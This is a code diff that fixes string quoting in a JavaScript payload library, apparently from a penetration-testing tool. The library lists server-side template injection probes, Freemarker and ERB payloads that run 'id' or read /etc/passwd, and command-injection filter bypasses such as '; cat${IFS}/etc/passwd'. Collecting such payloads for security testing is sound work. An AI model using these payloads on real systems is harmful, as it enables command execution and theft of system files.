@@ -988,11 +988,11 @@ const AI_KNOWLEDGE = {
         label: "Detection Payloads (Universal)",
         payloads: [
           `{{7*7}}`,
-          `${7*7}`,
+          "\${7*7}",
           `<%= 7*7 %>`,
           `#{7*7}`,
           `{{7*'7'}}`,
-          `${{7*7}}`,
+          "\${{7*7}}",
           `{7*7}`,
           `{{7+7}}`,
           `*{7*7}`,
@@ -1028,10 +1028,10 @@ const AI_KNOWLEDGE = {
       {
         label: "Freemarker (Java)",
         payloads: [
-          `${7*7}`,
-          `<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}`,
-          `[#assign rtc=class.forName('java.lang.Runtime')]`,
-          `${"freemarker.template.utility.Execute"?new()("id")}`,
+          "\${7*7}",
+          '<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}',
+          "[#assign rtc=class.forName('java.lang.Runtime')]",
+          '${"freemarker.template.utility.Execute"?new()("id")}',
         ]
       },
       {
@@ -1048,7 +1048,7 @@ const AI_KNOWLEDGE = {
         payloads: [
           `<%= 7*7 %>`,
           `<%= system("id") %>`,
-          `<%= `id` %>`,
+          "<%= `id` %>",
           `<%= File.open('/etc/passwd').read %>`,
           `<%= IO.popen('id').readlines() %>`,
         ]
@@ -1360,7 +1360,7 @@ const AI_KNOWLEDGE = {
           `; /bin/c?t /etc/passwd`,
           `; /b??/c?t /etc/passwd`,
           `; {cat,/etc/passwd}`,
-          `; cat${IFS}/etc/passwd`,
+          "; cat${IFS}/etc/passwd",
           `;IFS=,;cat,/etc/passwd`,
         ]
       },
